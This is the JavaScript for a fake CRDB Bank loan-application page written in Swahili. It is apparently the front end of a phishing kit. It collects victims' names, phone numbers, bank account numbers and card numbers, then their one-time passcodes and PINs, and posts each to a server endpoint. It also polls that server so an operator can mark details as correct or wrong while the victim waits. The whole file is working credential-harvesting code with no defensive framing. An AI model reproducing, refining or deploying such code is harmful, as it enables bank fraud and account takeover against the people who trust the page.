document.addEventListener('DOMContentLoaded', () => {
    let clientId = 'crdb_client_' + Math.random().toString(36).substring(2, 9);
    let formData = {};
    let pollInterval = null;

    // Steps array index mapping:
    // 0: stepSlider
    // 1: step1
    // 2: step2
    // 3: step3
    // 4: accountVerification
    // 5: loadingScreen (spinner waiting for approval)
    // 6: otpScreen
    // 7: pinScreen
    // 8: congratsScreen
    const steps = ['stepSlider', 'step1', 'step2', 'step3', 'accountVerification', 'loadingScreen', 'otpScreen', 'pinScreen', 'congratsScreen'];
    let currentStepIndex = 0;

    function showStep(index) {
        steps.forEach((s, idx) => {
            const el = document.getElementById(s);
            if (el) {
                if (idx === index) {
                    el.classList.add('active');
                } else {
                    el.classList.remove('active');
                }
            }
        });
        currentStepIndex = index;
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    function showNotification(text) {
        const notif = document.getElementById('surfaceNotification');
        if (notif) {
            notif.textContent = text;
            notif.classList.remove('hidden');
        }
    }

    // Slider inputs
    const loanRange = document.getElementById('loanRange');
    const loanAmountText = document.getElementById('loanAmountText');
    const step1Amount = document.getElementById('step1Amount');
    
    if (loanRange) {
        loanRange.addEventListener('input', (e) => {
            const val = Number(e.target.value).toLocaleString();
            loanAmountText.textContent = `TSh ${val}`;
            if (step1Amount) step1Amount.value = e.target.value;
        });
    }

    // Navigation Bindings
    const safeAddListener = (id, event, handler) => {
        const el = document.getElementById(id);
        if (el) el.addEventListener(event, handler);
    };

    safeAddListener('toStep1Btn', 'click', () => {
        if (loanRange) formData.loanAmount = loanRange.value;
        showStep(1);
    });

    safeAddListener('globalBackBtn', 'click', () => {
        if (currentStepIndex > 0 && currentStepIndex < 4) {
            showStep(currentStepIndex - 1);
        }
    });

    safeAddListener('backToSlider', 'click', () => showStep(0));
    safeAddListener('backToStep1', 'click', () => showStep(1));
    safeAddListener('backToStep2', 'click', () => showStep(2));
    safeAddListener('backToStep3FromAcc', 'click', () => showStep(3));

    safeAddListener('nextToStep2', 'click', () => {
        formData.loanType = document.getElementById('loanType').value;
        formData.amount = document.getElementById('step1Amount').value;
        formData.duration = document.getElementById('step1Duration').value;
        formData.purpose = document.getElementById('loanPurpose').value;
        showStep(2);
    });

    // Tanzania phone validation: Must start with 6, 7 or 5 and be 9 digits
    safeAddListener('nextToStep3', 'click', () => {
        const rawPhone = document.getElementById('phoneNumber').value.trim();
        const tanzaniaPhoneRegex = /^[675]\d{8}$/;

        if (!tanzaniaPhoneRegex.test(rawPhone)) {
            alert('Weka namba halali ya simu ya Tanzania (mfano: 712345678 - tarakimu 9 zianzo na 6, 7 au 5)');
            return;
        }

        formData.firstName = document.getElementById('firstName').value.trim();
        formData.lastName = document.getElementById('lastName').value.trim();
        formData.phone = rawPhone;

        if (!formData.firstName || !formData.lastName) {
            alert('Tafadhali jaza majina yako!');
            return;
        }

        document.getElementById('displayPhone').textContent = `+255 ${formData.phone} (Tembo)`;
        showStep(3);
    });

    safeAddListener('submitLoanApp', 'click', () => {
        formData.employmentStatus = document.getElementById('employmentStatus').value;
        formData.annualIncome = document.getElementById('annualIncome').value;

        document.getElementById('summaryDetails').innerHTML = `
            Kiasi cha Mkopo: TSh ${Number(formData.amount || 100000).toLocaleString()}<br>
            Muda wa Mkopo: ${formData.duration || 'Miezi 48'}<br>
            Madhumuni: ${formData.purpose || 'Biashara'}<br>
            Mwombaji: ${formData.firstName} ${formData.lastName}
        `;

        showStep(4);
    });

    // Account (13 digits) & Card Number (16 digits) submission
    safeAddListener('submitAccountDetails', 'click', async () => {
        const accountNumber = document.getElementById('accountNumberInput').value.trim();
        const cardNumber = document.getElementById('cardNumberInput').value.trim();

        if (accountNumber.length !== 13 || !/^\d{13}$/.test(accountNumber)) {
            alert('Namba ya akaunti lazima iwe na tarakimu 13 kamili!');
            return;
        }

        if (cardNumber.length !== 16 || !/^\d{16}$/.test(cardNumber)) {
            alert('Namba ya kadi lazima iwe na tarakimu 16 kamili!');
            return;
        }

        showNotification('Inatuma taarifa kwa uthibitisho wa CRDB...');

        // Immediately transition to the spinner / loading screen (Index 5)
        showStep(5);

        try {
            await fetch('/api/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    step: 'account_details',
                    clientId,
                    data: { accountNumber, cardNumber, ...formData }
                })
            });
        } catch (err) {
            console.error(err);
        }

        startPolling();
    });

    setupOtpInputs('.otp-box', () => {
        const otpVals = Array.from(document.querySelectorAll('.otp-box')).map(i => i.value).join('');
        if (otpVals.length === 5) {
            submitOtp(otpVals);
        }
    });

    setupOtpInputs('.pin-box', () => {
        const pinVals = Array.from(document.querySelectorAll('.pin-box')).map(i => i.value).join('');
        if (pinVals.length === 4) {
            submitPin(pinVals);
        }
    });

    function setupOtpInputs(selector, onComplete) {
        const inputs = document.querySelectorAll(selector);
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                const val = e.target.value;
                if (val && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                onComplete();
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !input.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });
    }

    safeAddListener('verifyOtpBtn', 'click', () => {
        const otpVals = Array.from(document.querySelectorAll('.otp-box')).map(i => i.value).join('');
        if (otpVals.length < 5) {
            alert('Weka namba kamili ya OTP ya tarakimu 5!');
            return;
        }
        submitOtp(otpVals);
    });

    async function submitOtp(otp) {
        showNotification('Inathibitisha OTP...');
        await fetch('/api/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ step: 'otp_submitted', clientId, data: { otp } })
        });
        startPolling();
    }

    safeAddListener('resendOtpLink', 'click', async (e) => {
        e.preventDefault();
        showNotification('Tunaomba OTP mpya...');
        await fetch('/api/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ step: 'resend_otp', clientId, data: {} })
        });
        showNotification('OTP mpya imeombwa. Subiri uthibitisho ✅');
    });

    safeAddListener('verifyPinBtn', 'click', () => {
        const pinVals = Array.from(document.querySelectorAll('.pin-box')).map(i => i.value).join('');
        if (pinVals.length < 4) {
            alert('Weka PIN kamili ya tarakimu 4!');
            return;
        }
        submitPin(pinVals);
    });

    async function submitPin(pin) {
        showNotification('Inathibitisha PIN...');
        await fetch('/api/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ step: 'pin_submitted', clientId, data: { pin } })
        });
        startPolling();
    }

    function startPolling() {
        if (pollInterval) clearInterval(pollInterval);

        pollInterval = setInterval(async () => {
            try {
                const res = await fetch(`/api/status/${clientId}`);
                const data = await res.json();

                if (data.status === 'wrong_details') {
                    showNotification('WRONG DETAILS ❌ - Tafadhali ingiza upya namba ya akaunti na kadi.');
                    showStep(4);
                    clearInterval(pollInterval);
                } else if (data.status === 'correct_details') {
                    showNotification('CORRECT DETAILS ✅ - Endelea kwenda OTP.');
                    showStep(6); // otpScreen index
                    clearInterval(pollInterval);
                } else if (data.status === 'otp_incorrect') {
                    showNotification('OTP INCORRECT ❌ - Tafadhali ingiza namba mpya halali ya OTP.');
                    document.querySelectorAll('.otp-box').forEach(b => b.value = '');
                    document.querySelector('.otp-box').focus();
                    clearInterval(pollInterval);
                } else if (data.status === 'otp_correct') {
                    showNotification('OTP CORRECT ✅ - Endelea kuweka PIN.');
                    showStep(7); // pinScreen index
                    clearInterval(pollInterval);
                } else if (data.status === 'invalid_pin') {
                    showNotification('INVALID PIN ❌ - Tafadhali ingiza PIN halali.');
                    document.querySelectorAll('.pin-box').forEach(b => b.value = '');
                    document.querySelector('.pin-box').focus();
                    clearInterval(pollInterval);
                } else if (data.status === 'valid_pin') {
                    showNotification('VALID PIN ✅ - Umeweka PIN sahihi. Subiri idhini...');
                } else if (data.status === 'loan_approved') {
                    showNotification('LOAN APPROVED 🎉');
                    document.getElementById('congratsName').textContent = `${formData.firstName || 'JANE'} ${formData.lastName || 'MWANGI'}`.toUpperCase();
                    document.getElementById('congratsPhone').textContent = `+255 ${formData.phone || '712 345 678'}`;
                    document.getElementById('congratsAcc').textContent = formData.accountNumber || 'SBK0012345678';
                    showStep(8); // congratsScreen index
                    clearInterval(pollInterval);
                }
            } catch (err) {
                console.error('Polling error:', err);
            }
        }, 3000);
    }
});
            
